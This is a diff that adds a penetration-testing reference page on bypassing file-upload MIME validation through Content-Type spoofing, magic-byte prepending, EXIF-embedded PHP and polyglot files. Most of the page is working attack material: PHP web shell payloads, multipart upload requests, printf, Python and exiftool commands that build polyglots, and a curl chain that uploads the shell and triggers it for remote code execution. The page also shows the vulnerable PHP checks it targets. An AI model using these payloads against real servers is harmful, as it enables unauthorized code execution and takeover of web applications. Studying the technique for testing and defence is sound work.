@@ -1,0 +1,374 @@
+---
+title: Content-Type bypass
+description: Defeating MIME validation - spoofing the Content-Type header, prepending magic bytes for content-sniffing checks, and polyglot files.
+mitre: [T1190, T1027]
+d3fend: [D3-FA]
+impact: [RCE, ServerSideEval]
+owasp: [A03]
+sidebar:
+  order: 6
+  label: Content-Type bypass
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Two content validations: HTTP header (client-controlled) and magic-byte sniffing (file-content-controlled). Both are bypassable.
+
+```
+# 1. Spoof Content-Type header
+Content-Disposition: form-data; name="uploadFile"; filename="shell.phar"
+Content-Type: image/jpeg              # claim it's a JPEG
+                                       # file content can be pure PHP
+
+<?php system($_GET["cmd"]); ?>
+
+# 2. Bypass magic-byte sniffing - prepend image bytes to PHP
+GIF8<?php system($_GET["cmd"]); ?>    # GIF magic bytes + PHP
+
+# 3. Both together - for layered defenses
+filename="shell.phar"  +  Content-Type: image/gif  +  body starts "GIF8"
+```
+
+Success indicator: file uploads as PHP/script, executes despite content-validation defense.
+
+## What content validation does
+
+Two distinct checks the application might do:
+
+| Check | Source | Bypass |
+| --- | --- | --- |
+| `Content-Type` header | The HTTP multipart header on the upload | Edit the request - client-controlled |
+| MIME / magic-byte sniffing | First N bytes of the file content | Prepend valid magic bytes to malicious content |
+
+Either check alone is insufficient. Together, they're harder but still bypassable.
+
+### Vulnerable code (header check)
+
+```php
+$type = $_FILES['uploadFile']['type'];   // ← from HTTP header, attacker-controlled
+
+if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
+    echo "Only images allowed";
+    die();
+}
+```
+
+The `$_FILES['uploadFile']['type']` value is taken from the HTTP `Content-Type` header in the multipart body - set by the browser based on the file extension, fully attacker-controllable in a manual upload.
+
+### Vulnerable code (sniff check)
+
+```php
+$type = mime_content_type($_FILES['uploadFile']['tmp_name']);   // ← reads file content
+
+if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
+    echo "Only images allowed";
+    die();
+}
+```
+
+`mime_content_type()` and `finfo_file()` look at the file's actual bytes - specifically the first few bytes (magic bytes). The Content-Type header is ignored. Bypass by manipulating the file content itself.
+
+## Method 1 - Content-Type header spoofing
+
+The cheapest bypass. The HTTP `Content-Type` in the multipart body is whatever the client sends - change it in Burp:
+
+```http
+POST /upload.php HTTP/1.1
+Host: target.example.com
+Content-Type: multipart/form-data; boundary=---X
+
+-----X
+Content-Disposition: form-data; name="uploadFile"; filename="shell.phar"
+Content-Type: image/jpeg                  ← changed from application/x-php
+
+<?php system($_GET["cmd"]); ?>
+-----X--
+```
+
+The application reads `image/jpeg` from this header, passes its allowlist, accepts the file. The content is still PHP. RCE.
+
+### Common image Content-Types to spoof
+
+```
+image/jpeg
+image/jpg
+image/png
+image/gif
+image/webp
+image/svg+xml
+image/bmp
+image/tiff
+```
+
+A more comprehensive list:
+
+```bash
+# SecLists Content-Type wordlist
+/opt/useful/SecLists/Miscellaneous/web/content-type.txt
+```
+
+Filter to image types for upload-validation fuzzing:
+
+```bash
+grep "image/" /opt/useful/SecLists/Miscellaneous/web/content-type.txt > /tmp/image-content-types.txt
+```
+
+### Two Content-Type headers in the request
+
+A multipart upload has *two* `Content-Type` headers:
+
+```http
+POST /upload.php HTTP/1.1
+Host: target.example.com
+Content-Type: multipart/form-data; boundary=---X    ← outer (the request itself)
+
+-----X
+Content-Disposition: form-data; name="uploadFile"; filename="shell.phar"
+Content-Type: image/jpeg                           ← inner (the uploaded file)
+
+<?php system($_GET["cmd"]); ?>
+-----X--
+```
+
+Don't touch the outer one - it tells the server how to parse the multipart body and must stay as `multipart/form-data; boundary=...`. The inner one is the per-file type, the bypass target.
+
+In some upload designs the file goes in the request body directly (not multipart) - then only the outer header exists and that's what you modify. Test by sending an upload first to see the request shape.
+
+## Method 2 - Magic byte prepending
+
+When the application uses content sniffing (`mime_content_type`, `finfo`, etc.), the Content-Type header bypass alone doesn't work - the file's bytes get inspected. The bypass is to make the bytes *look like* an image.
+
+### File magic bytes - the canonical list
+
+The first few bytes of a file identify its type. For images:
+
+| Format | Magic bytes (hex) | Magic bytes (ASCII) |
+| --- | --- | --- |
+| GIF87a | `47 49 46 38 37 61` | `GIF87a` |
+| GIF89a | `47 49 46 38 39 61` | `GIF89a` |
+| JPEG | `FF D8 FF E0` | (non-printable) |
+| JPEG (JFIF) | `FF D8 FF E0 00 10 4A 46 49 46` | (non-printable) `JFIF` |
+| PNG | `89 50 4E 47 0D 0A 1A 0A` | (non-printable) `PNG` |
+| BMP | `42 4D` | `BM` |
+| WebP | `52 49 46 46 ?? ?? ?? ?? 57 45 42 50` | `RIFF` ... `WEBP` |
+| TIFF (LE) | `49 49 2A 00` | `II*` |
+| TIFF (BE) | `4D 4D 00 2A` | `MM*` |
+
+GIF is the operator's favorite - its magic bytes (`GIF8`) are ASCII printable, can be embedded with a regular `echo`, and most content sniffers accept any file starting with `GIF8` as a GIF.
+
+### Crafting the polyglot
+
+A file that's both a valid image header and valid PHP:
+
+```bash
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.phar
+```
+
+Hexdump:
+
+```
+00000000  47 49 46 38 3c 3f 70 68  70 20 73 79 73 74 65 6d  |GIF8<?php system|
+00000010  28 24 5f 47 45 54 5b 22  63 6d 64 22 5d 29 3b 20  |($_GET["cmd"]);|
+00000020  3f 3e 0a                                          |?>.|
+```
+
+`mime_content_type("shell.phar")` returns `image/gif` - passes content-sniffing check. The file is still executable as PHP because Apache executes based on extension (`.phar`), not content.
+
+```bash
+$ echo 'GIF8' > test.gif
+$ file test.gif
+test.gif: GIF image data
+
+$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > test.phar
+$ file test.phar
+test.phar: GIF image data
+```
+
+The `file` command (and PHP's content sniffers, which use the same logic) agree it's a GIF. Apache's PHP handler doesn't care about content - it sees `.phar` and runs as PHP.
+
+### JPEG magic bytes (non-ASCII)
+
+When GIF is filtered specifically, use JPEG:
+
+```bash
+printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01<?php system($_GET["cmd"]); ?>' > shell.phar
+```
+
+Or with Python for cleaner hex construction:
+
+```bash
+python3 -c "
+import sys
+sys.stdout.buffer.write(b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01')
+sys.stdout.buffer.write(b'<?php system(\$_GET[\"cmd\"]); ?>')
+" > shell.phar
+```
+
+### PNG magic bytes
+
+```bash
+python3 -c "
+import sys
+sys.stdout.buffer.write(b'\x89PNG\r\n\x1a\n')
+sys.stdout.buffer.write(b'<?php system(\$_GET[\"cmd\"]); ?>')
+" > shell.phar
+```
+
+### Combining magic bytes + Content-Type header
+
+Apps with both validation layers need both bypasses:
+
+```http
+POST /upload.php HTTP/1.1
+Host: target.example.com
+Content-Type: multipart/form-data; boundary=---X
+
+-----X
+Content-Disposition: form-data; name="uploadFile"; filename="shell.phar"
+Content-Type: image/gif                           ← header spoof
+
+GIF8                                              ← magic bytes
+<?php system($_GET["cmd"]); ?>                    ← PHP payload
+-----X--
+```
+
+The `image/gif` header passes the HTTP-header check. The `GIF8` prefix passes the content-sniff check. The `.phar` extension passes the executable-extension whitelist. Apache executes the file as PHP.
+
+## Method 3 - EXIF / image-metadata embedding
+
+For applications that validate even more strictly - running the file through an image decoder to verify it's a real image - `GIF8` alone may fail because the file isn't a *valid* GIF (just has the magic bytes).
+
+Embed the PHP code in real image metadata:
+
+```bash
+# Take a real image, embed PHP in EXIF
+cp real.jpg shell.phar
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.phar
+```
+
+The image file is still a valid, decoder-passing JPEG. PHP's `<?php ... ?>` block lives inside the EXIF comment. When `include()` or any PHP execution context runs the file, PHP scans the bytes for `<?php` tags and executes them.
+
+For the upload-to-RCE path specifically (where the file is executed as PHP based on extension), this approach works even against the strictest content validation:
+
+- Image decoders see a valid JPEG → pass
+- Magic-byte sniffers see JPEG bytes → pass
+- Content-Type checks see `image/jpeg` → pass
+- Apache PHP handler sees `.phar` → execute as PHP
+- PHP parser finds the `<?php` block inside the EXIF → run it
+
+### Other EXIF fields
+
+```bash
+# Different fields that take arbitrary text
+exiftool -Comment='...' file.jpg
+exiftool -Artist='...' file.jpg
+exiftool -ImageDescription='...' file.jpg
+exiftool -Copyright='...' file.jpg
+exiftool -Make='...' file.jpg
+exiftool -UserComment='...' file.jpg
+```
+
+When the application displays specific EXIF fields, that field is also an [XSS vector](/codex/web/uploads/limited-uploads/) - see the limited uploads page.
+
+### Polyglot images for XSS
+
+A separate but related technique: an image that's also a valid HTML/JS file. The same file:
+
+- Displays as an image when loaded via `<img src="...">`
+- Executes JS when loaded via `<script src="...">`
+
+These are constructed with specific byte sequences that satisfy both parsers. Out of scope for the upload-to-RCE path, but worth knowing about for XSS-via-upload scenarios.
+
+## Method 4 - Disable content sniffing
+
+If the application uses `mime_content_type()` but the file appears valid, the result depends on what `magic` database is installed and how it interprets the bytes. Sometimes a file containing both image and PHP markers gets identified as PHP regardless of magic bytes at the start.
+
+Test offline first:
+
+```bash
+file shell.phar               # what the system thinks
+php -r 'echo mime_content_type("shell.phar");'    # what PHP thinks
+```
+
+If `mime_content_type` returns the right type (matching your spoofed Content-Type), the upload should pass content validation.
+
+## Method 5 - Combining all bypasses
+
+The full-stack bypass against a defense with whitelist + Content-Type + magic-byte validation:
+
+```http
+POST /upload.php HTTP/1.1
+Host: target.example.com
+Content-Type: multipart/form-data; boundary=---X
+
+-----X
+Content-Disposition: form-data; name="uploadFile"; filename="shell.phar.jpg"
+Content-Type: image/jpeg
+
+ÿØÿà
+<?php system($_GET["cmd"]); ?>
+-----X--
+```
+
+What each layer sees:
+
+- **Whitelist** (regex `^.*\.(jpg|jpeg|png|gif)$`) - checks filename ends with `.jpg` - pass
+- **Content-Type check** - sees `image/jpeg` - pass
+- **Magic-byte sniff** - sees `ÿØÿà` (JPEG bytes) - pass
+- **Apache PHP handler** (regex `.+\.ph(p|tml|ar)`) - sees `.phar` in filename - execute as PHP
+- **PHP parser** - finds `<?php` block after the JPEG bytes - execute
+
+Five layers, four bypassed simultaneously. The remaining one (Apache PHP handler) is configuration, not validation.
+
+Note the literal newline between the JPEG bytes and `<?php`. PHP requires `<?php` to start at column 0 of a line in some configurations - the newline before it ensures this. Without the newline, parsing might fail.
+
+## Worked example - full bypass chain
+
+A target that combines client-side validation, extension whitelist, Content-Type check, and magic-byte sniffing:
+
+```bash
+# Step 1 - disable client-side validation in browser inspector
+# (or just use curl/Burp directly)
+
+# Step 2 - build the polyglot
+printf '\xff\xd8\xff\xee\n<?php system($_REQUEST["cmd"]); ?>' > shell.jpg.phar
+
+# Step 3 - upload via curl
+curl -F "uploadFile=@shell.jpg.phar;type=image/jpeg" \
+     -b "PHPSESSID=..." \
+     https://target/upload.php
+
+# Step 4 - verify and trigger
+curl "https://target/uploads/shell.jpg.phar?cmd=id"
+# → uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+The `;type=image/jpeg` after the filename in curl's `-F` flag sets the per-file Content-Type header. Combined with the JPEG magic bytes (`\xff\xd8\xff\xee`), the `.phar` extension at the end, and the wrapping double-extension, this bypass passes all common layered validations.
+
+## Detection-only payloads
+
+A clean confirmation that bypasses are working without committing to a real shell:
+
+```bash
+# Build a polyglot test payload
+printf 'GIF8<?php echo "POLYGLOT_OK"; ?>' > test.phar
+
+# Upload with full bypass
+curl -F "uploadFile=@test.phar;type=image/gif" https://target/upload.php
+
+# Trigger
+curl "https://target/uploads/test.phar"
+# If response contains "POLYGLOT_OK" → all bypasses worked, RCE confirmed
+```
+
+## Notes
+
+- **The `GIF8` magic-byte trick relies on permissive sniffers.** Modern `mime_content_type()` on glibc's full magic database may reject a file as a valid GIF if the rest of the structure is malformed. The trick works reliably on minimal systems and Docker images; less reliably on full Linux installs with comprehensive magic databases.
+- **EXIF embedding is the strongest content-validation bypass.** When the application runs the file through an actual image decoder, the embedded-EXIF approach is the only reliable way through - a real image with PHP hidden in metadata.
+- **The Apache `.phar` execution behavior is configuration-dependent.** Test by uploading a known-PHP file with `.phar` extension and a known marker to confirm. Some hardened configurations restrict `.phar` to actual PHP archives.
+- **Content-Type checking is sometimes done on the wrong header.** When the application reads `$_FILES['file']['type']`, that's the per-file header. When it reads the Request Content-Type, that's the outer multipart header (which is always `multipart/form-data; boundary=...` for uploads). Confusion in the application code sometimes means the validator looks at a header that doesn't matter.
+
+<Aside type="tip">
+The shortest viable content-validation bypass: `GIF8<?php system($_GET["cmd"]); ?>` saved as `shell.phar`, uploaded with `Content-Type: image/gif`. This single payload defeats the three most common content validations simultaneously and works against PHP applications running on Apache with default PHP handler configuration. If this doesn't work, the target is using image decoder validation - switch to EXIF embedding.
+</Aside>
